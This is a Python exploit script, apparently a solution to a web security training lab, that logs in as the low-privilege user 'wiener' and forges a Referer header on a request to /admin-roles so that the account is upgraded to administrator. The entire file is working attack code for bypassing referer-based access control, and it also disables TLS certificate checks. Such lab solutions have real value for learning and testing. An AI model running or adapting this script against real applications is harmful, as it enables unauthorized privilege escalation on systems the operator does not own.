import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080' }

def refer_based_access_control_exploit(s, url):

    # step 1 -> login as wiener the given creds username=wiener&password=peter
    login_url = url + '/login'
    login_data = { 'username':'wiener', 'password':'peter' }
    r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
    res = r.text
    if "Log out" in res:
        print('(+) Wiener login successful!')

        # step 2 : manipulate Referer url and parameters to upgrade user wiener
        refer_privilege_url = url + "/admin-roles?username=wiener&action=upgrade"
        headers = { "Referer" : url + '/admin' }
        r = s.get(refer_privilege_url, headers=headers, verify=False, proxies=PROXIES)
        res = r.text
        if "wiener (ADMIN)" in res:
            print("Exploit sucessful : wiener is ADMIN now")
        else:
            print("Exploit failed. : wiener is normal user")
    else:
        print('(+) Wiener login failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    print('[*] Starting the exploit : Broken Access Control - Referer-based access control')
    refer_based_access_control_exploit(s, url)

if __name__ == "__main__":
    main()
